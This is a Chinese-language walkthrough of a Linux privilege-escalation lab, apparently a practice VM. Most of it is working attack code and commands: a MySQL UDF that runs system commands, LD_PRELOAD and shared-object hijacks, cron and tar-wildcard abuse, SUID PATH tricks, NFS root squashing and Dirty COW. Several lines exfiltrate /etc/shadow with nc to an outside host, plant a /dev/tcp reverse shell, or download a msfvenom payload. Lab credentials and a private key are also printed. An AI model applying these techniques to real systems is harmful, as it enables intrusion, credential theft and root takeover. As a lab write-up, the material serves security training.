# linuxprivesc

**SSH**
```
ssh user@10.10.136.251 -oHostKeyAlgorithms=+ssh-rsa
password321
```

**如果您收到錯誤訊息，說明這是因為 OpenSSH 已棄用 ssh-rsa。新增到您的命令中以進行連接。**
```
Unable to negotiate with <IP> port 22: no matching how to key type found. Their offer: ssh-rsa, ssh-dss
```

---


## 服務漏洞

MySQL 服務以 root 身分執行，且該服務的「root」使用者沒有分配密碼

UDF提权

**raptor_udf2.c**
```c

#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
        unsigned int            arg_count;      // number of arguments
        enum Item_result        *arg_type;      // pointer to item_result
        char                    **args;         // pointer to arguments
        unsigned long           *lengths;       // length of string args
        char                    *maybe_null;    // 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
        char                    maybe_null;     // 1 if func can return NULL
        unsigned int            decimals;       // for real functions
        unsigned long           max_length;     // for string functions
        char                    *ptr;           // free ptr for func data
        char                    const_item;     // 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
        if (args->arg_count != 1)
                return(0);

        system(args->args[0]);

        return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
        return(0);
}
```



**編譯和生成一個名為 raptor_udf2.so 的共享庫**

```
gcc -g -c raptor_udf2.c -fPIC

-g：生成包含 GDB 調試信息的目標文件。
-c：只編譯，不連結，生成目標文件。
-fPIC：生成位置無關代碼，這對於共享庫是必需的。



gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

-g：同樣，生成包含 GDB 調試信息的目標文件。
-shared：生成共享庫。
-Wl,-soname,raptor_udf2.so：指定共享庫的 soname。
-o raptor_udf2.so：指定輸出文件名。
raptor_udf2.o：要連結的目標文件。
-lc：與 C 函數庫連結。

```




**找到 mysql  服務是用 root 權限**
```
ps -aux | grep mysql
```
```
root      1965  0.0  4.7 163420 24120 ?        Sl   22:38   0:01 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
```




**以 root 使用者身分使用空白密碼連線到 MySQL 服務：**

```
mysql -u root 


SELECT CURRENT_USER();
show databases;


use mysql;

创建一个名为 foo 的表，其中包含一个 blob 类型的列，列名为 line。在这个上下文中，blob 是二进制大对象
create table foo(line blob);


将加载指定路径下的文件，到名为 foo 的表中
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));


將他複製到/usr/lib/mysql/plugin/ (因為MYSQL 是 ROOT)
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';



该函数名为 do_system，返回类型为整数（integer），并指定了共享库的名称为 raptor_udf2.so。这样的 UDF 可以允许执行系统命令
create function do_system returns integer soname 'raptor_udf2.so';


//copy  bash 到 tmp 並給SUID權限
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

//root bash
-rwsr-s--x  1 root root 926536 Dec  1 00:09 rootbash

加上 -p
/tmp/rootbash -p
```

總的來說，`-p` 選項主要用於在一個受限和安全的環境中啟動 shell，同時可能提供一些特權操作的能力。使用這個選項需要謹慎，並確保你了解其影響以及有權執行這樣的特權操作。


---

## 弱檔權限 - 可讀 /etc/shadow

請注意，虛擬機器上的 /etc/shadow 檔案是可讀的：


cat /etc/passwd >> passwd.txt
cat /etc/shadow >> shadow.txt



受害者傳過來
nc 10.18.1.192 4444 < passwd.txt
nc 10.18.1.192 4444 < shadow.txt

攻擊者監聽
nc -l -p 4444 > passwd.txt
nc -l -p 4444 > shadow.txt


unshadow passwd.txt shadow.txt > unshadowed.txt




john unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt
//password123      (root)    


---

## 替換root密碼  可寫 /etc/shadow


```
ls -l /etc/shadow

//居然可以寫入
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
```


**那就可以替換root密碼，創建123456密碼的 hash 並登入**
```
mkpasswd -m sha-512 123456

$6$q3HXe6My0ZA$X1GasQu62y/5TlL3RSd73fyudSSEctKtUx5xI0puox4bmY32pHTD2TLIrFRSJOtYQuralaJ6MNMPDFXLYQmfG1


root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::

替換
root:$6$q3HXe6My0ZA$X1GasQu62y/5TlL3RSd73fyudSSEctKtUx5xI0puox4bmY32pHTD2TLIrFRSJOtYQuralaJ6MNMPDFXLYQmfG1:17298:0:99999:7:::

```


##  替換root密碼 - 可寫 /etc/passwd

* /etc/passwd 檔案也可包含使用者密碼雜湊值，某些版本的Linux仍然允許將密碼雜湊值儲存在此處。



**生成新密碼**
```
mkpasswd -m sha-512 1234567

$6$PjuN61fuvUD0hv$b9IAcJpr4CsMGMifEplWEA0ZryIRvOXWP/9KhBBde0X1x7p4ZWjp5TsUj9kRNThRu2jSjJw2jqc1f5/RXx9Af0
```




**cat /etc/passwd  "x" 或 "*" 之类的占位符表示密码已经移动到了 /etc/shadow 文件**
```
root:x:0:0:root:/root:/bin/bash


root:$6$PjuN61fuvUD0hv$b9IAcJpr4CsMGMifEplWEA0ZryIRvOXWP/9KhBBde0X1x7p4ZWjp5TsUj9kRNThRu2jSjJw2jqc1f5/RXx9Af0:0:0:root:/root:/bin/bash

```

* 此時雖然/etc/shadow 有舊密碼，不過判定是 etc/passwd 為優先。




---

## Sudo - Shell 

GTFOBins 
https://gtfobins.github.io



**查看sudo 權限**
```
sudo -l


(root) NOPASSWD: /usr/sbin/iftop
(root) NOPASSWD: /usr/bin/find
(root) NOPASSWD: /usr/bin/nano
(root) NOPASSWD: /usr/bin/vim
(root) NOPASSWD: /usr/bin/man
(root) NOPASSWD: /usr/bin/awk
(root) NOPASSWD: /usr/bin/less
(root) NOPASSWD: /usr/bin/ftp
(root) NOPASSWD: /usr/bin/nmap
(root) NOPASSWD: /usr/sbin/apache2
(root) NOPASSWD: /bin/more
```


**提權**
```
sudo find . -exec /bin/sh \; -quit
```


---


## Sudo - 環境變量




**查看sudo 權限**
```
sudo -l

env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more



LD_PRELOAD 和 LD_LIBRARY_PATH 都是從使用者環境繼承的。 當程式運行時，
LD_PRELOAD 在任何其他物件之前載入共用物件。
LD_LIBRARY_PATH 提供首先搜尋共享庫的目錄清單。
```






**preload.c**
```c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}

```




**生成 /tmp/preload.so**
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```


**提權**
```
sudo  LD_PRELOAD=/tmp/preload.so   man
```



### LD_LIBRARY_PATH 權限
```
sudo -l

env_keep+=LD_LIBRARY_PATH
//也就是說，可以自己設定library
```




對 apache2 程式檔案執行 ldd 以查看該程式使用了哪些共用程式庫：

```
ldd /usr/sbin/apache2
```

```
linux-vdso.so.1 =>  (0x00007fff1b1ff000)
libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007faf9ece8000)
libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007faf9eac4000)
libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007faf9e88a000)
libpthread.so.0 => /lib/libpthread.so.0 (0x00007faf9e66e000)
libc.so.6 => /lib/libc.so.6 (0x00007faf9e302000)
libuuid.so.1 => /lib/libuuid.so.1 (0x00007faf9e0fd000)
librt.so.1 => /lib/librt.so.1 (0x00007faf9def5000)
libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007faf9dcbe000)
libdl.so.2 => /lib/libdl.so.2 (0x00007faf9dab9000)
libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007faf9d891000)
/lib64/ld-linux-x86-64.so.2 (0x00007faf9f1a5000)
```
* 這些都是預設會去/usr/lib/  底下找動態連接庫
* 我們挑選 libcrypt.so.1



**library_path.c**

```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```





**生成同名的共用物件 (libcrypt.so.1) 放在tmp** 
```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```


**指定要去 tmp 底下載庫，觸發** 
```
sudo LD_LIBRARY_PATH=/tmp apache2
```



---


## Cron 作業 - 檔案權限 



```
cat /etc/crontab

//兩個root task
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

找到路徑
```
find / -name overwrite.sh 2>/dev/null

/usr/local/bin/overwrite.sh
```


檔案權限
```
ls -al /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
//可寫


ls -al /usr/local/bin/compress.sh
-rwxr--r-- 1 root staff 53 May 13  2017 /usr/local/bin/compress.sh
//不可寫
```



vim 寫reverse shell
```
vim /usr/local/bin/overwrite.sh


#!/bin/bash
bash -i >& /dev/tcp/10.18.1.192/4444 0>&1
```


kali 監聽
```
nc -lvnp 4444 (拿到root)
```
---

## Cron 作業 - PATH 環境變量




Crontab 環境變量(注意 /home/user)
```
cat /etc/crontab

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

```


Crontab 任務
```
cat /etc/crontab

* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```



創建overwrite. sh，他沒指定路徑。
```
cd /home/user
touch overwrite.sh
chmod +x /home/user/overwrite.sh
```


vim  overwrite. sh  (寫入)
```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

root
```
/tmp/rootbash -p
```

---

## Cron 作業 - 通配符



cat /etc/crontab
```
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```


cat /usr/local/bin/compress.sh
```
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```


**注意關鍵就在於 通配符***
```
tar czf /tmp/backup.tar.gz *
```
壓縮當前目錄下的所有文件和目錄，並將它們打包成一個名為 backup.tar.gz 的壓縮檔。該檔案會存儲在 /tmp/ 目錄下。


kali 生成 shell.elf
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.1.192 LPORT=4444 -f elf -o shell.elf
php -S 0.0.0.0:80
```

下載shell.elf
```
cd /home/user/ 
wget http://10.18.1.192/shell.elf
chmod +x /home/user/shell.elf
```

在 /home/user 中建立這兩個檔案：
```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```


相當於執行了
```
tar czf /tmp/backup.tar.gz *

tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=shell.elf
```


拿到root
```
nc -lvnp 4444 
```



---


## SUID / SGID 可執行檔 - 已知漏洞


所有 SUID/SGID 可執行檔：

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
```
-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
```

* 請注意，/usr/sbin/exim-4.84-3 出現在結果中

**exploit DB找到 下載腳本Exim 4.84-3 - Local Privilege Escalation**
```
wget http://10.18.1.192/39535.sh

網上下載的有點問題，我修了一下，可以成功
tr -d '\r' < 39535.sh > 39535_fixed.sh

chmod +x /home/user/39535_fixed.sh

拿root
/home/user/39535_fixed.sh 
```


**或是直接官方給的拿shell**
```
/home/user/tools/suid/exim/cve-2016-1531.sh
```

---

## SUID / SGID 可執行檔 - 共享物件注入

* 類似dll注入


所有 SUID/SGID 可執行檔：
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

找到
```
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
```


執行看看
```
/usr/local/bin/suid-so
```


strace 好好用 最主要查看 lib 調用過程有哪些目錄是可以竄改的
```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

結果:
```
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)

```

看到這裡 /home/user/ 我們很熟悉，
```
可以寫入而且他也找不到/home/user/.config/libcalc.so
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```


為 libcalc.so 檔案建立.config目錄：
```
mkdir /home/user/.config
```

共用物件程式碼 libcalc.c
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```



生成 /home/user/.config/libcalc.so  共享物件
```
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```


拿root
```
/usr/local/bin/suid-so
```

---


## SUID / SGID 可執行檔 - 環境變數





所有 SUID/SGID 可執行檔：
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```


找到
```
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
```



執行該文件並注意它似乎正在嘗試啟動 apache2 Web 伺服器：
```
/usr/local/bin/suid-env
```



使用 strings 命令可以帮助您检查二进制文件中可能包含的信息
```
strings /usr/local/bin/suid-env

/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start

```

關鍵找到
```
service apache2 start
```


未使用執行檔的完整路徑，所以我們要替換service


**service.c**
```c
int main() {
        setuid(0);
        system("/bin/bash -p");
}
```



生成 service 執行檔
```
gcc -o service /home/user/tools/suid/service.c
```


當前目錄有個service 
```
/home/user/service
```



加入. 當前目錄
```
PATH=.:$PATH
```

查看$PATH 
```
echo $PATH 

//注意.在最前面，也就是當前目錄
.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin

```

或是 (這個比較清楚)
export PATH=/home/user:$PATH
```
/home/user:.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin

```

拿root
```
/usr/local/bin/suid-env
```

---

## SUID / SGID 執行檔 - 濫用 Shell 功能 (#1)


跟上題類似只是它 使用服務執行檔的絕對路徑
```
strings /usr/local/bin/suid-env2


/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start

```

絕對路徑
```
/usr/sbin/service apache2 start
```



**早期 Bash 版本中 <4.2-048 ，可以使用類似檔案路徑的名稱定義 shell 函數，然後匯出這些函數，以便使用它們而不是該檔案路徑中的任何實際執行檔。**


查看bash版本
```
/bin/bash --version
//GNU bash, version 4.1.5
```


建立一個名為「/usr/sbin/service」的 Bash 函數，該函數執行新的 Bash shell（使用 -p 以便保留權限）並匯出該函數

```
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```


拿root
```
/usr/local/bin/suid-env2
```
---

## SUID / SGID 執行檔 - 濫用 Shell 功能 (#2)



注意：這不適用於 Bash 4.4 及更高版本。

在偵錯模式下，Bash 使用環境變數PS4顯示偵錯語句的額外提示。

運行/usr/local/bin/suid-env2可執行文件，並啟用 bash 調試並將 PS4 變數設置為嵌入式命令，該命令創建 /bin/bash 的 SUID 版本：




```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2


env -i: 这部分用于启动一个新的清空的环境，不继承当前环境中的变量。

SHELLOPTS=xtrace: 这个设置是为了开启 Bash 的 xtrace 模式，它会显示执行的每个命令，通常用于调试。

PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)': PS4 是用于设置 xtrace 
输出的前缀。在这个命令中，它被设置为一个用于复制 /bin/bash 到 /tmp/rootbash 并赋予可执行权限的 Bash 命令。

/usr/local/bin/suid-env2: 最后一个部分是要执行的命令。

```


拿root
```
/tmp/rootbash -p
```
---

## 密碼和密鑰 - 歷史文件

**名子有關history的文件 例如 .bash_history**
```
cat ~/.*history | less
```

找到
```
mysql -h somehost.local -u root -p password123
```

**可以切換到root了**

```
su root
```

## 密碼和金鑰 - 設定文件


設定檔通常包含明文或其他可逆格式的密碼。
```
ls /home/user
```


找到myvpn.ovpn
```
cat /home/user/myvpn.ovpn
```

```
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0
```


打印
```
cat /etc/openvpn/auth.txt

root
password123

```


---

## 密碼和金鑰 - SSH 金鑰




在系統根目錄中尋找隱藏檔案和目錄：
```
ls -la /
```


似乎有一個名為.ssh，無法CD 進入，但可以ls打印
```
ls -l /.ssh
```




```
cat /.ssh/root_key 
```


找到SSH私鑰
```
-----BEGIN RSA PRIVATE KEY----
MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm
gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl
p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo
OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD
eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET
Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2
NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ
YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+
5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el
WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7
VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7
6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW
1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K
824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6
Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc
U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1
Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi
SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV
d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im
jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa
871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok
X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4
CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN
Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4
LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==
-----END RSA PRIVATE KEY-----

```
.....


**複製到kali 存成 root_key，並給執行權限**
```
sudo chmod +x root_key

```


**登入root**
```
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.136.251
```

---


## 網路檔案系統


NFS 共用配置
```
cat /etc/exports

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
* 看到no_root_squash






在 Kali 機器上，請切換到 root 使用者：
```
su root

mkdir /tmp/nfs


mount -o rw,vers=3 10.10.136.251:/tmp /tmp/nfs
//10.10.34.174 的伺服器上的 /tmp 目錄掛載到本地的 /tmp/nfs 目錄
//-o rw：以讀寫模式掛載 NFS 分享，允許進行讀取和寫入操作


查看掛載狀態
mount | grep nfs

取消掛載
sudo umount -l /tmp/nfs
```


使用msfvenom產生有效負載
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

使檔案可執行並設定 SUID 權限：
```
chmod +xs /tmp/nfs/shell.elf
```


切換回受害者拿shell
```
/tmp/shell.elf
```



---


## 核心漏洞


運行Linux Exploit Suggester 2，官方幫我們準備好了
```
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
```


Dirty COW CVE-2016-5195
```
http://www.exploit-db.com/exploits/40616
```



官方還幫我們準備好
```
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
```



執行它將 SUID 檔案 /usr/bin/passwd 替換為產生 shell 的檔案（/usr/bin/passwd 的備份在 /tmp/bak 中進行）。
```
./c0w
```



拿root
```
/usr/bin/passwd
```



## 權限提升腳本


有三個工具
```
LinEnum.sh  linpeas.sh  lse.sh

```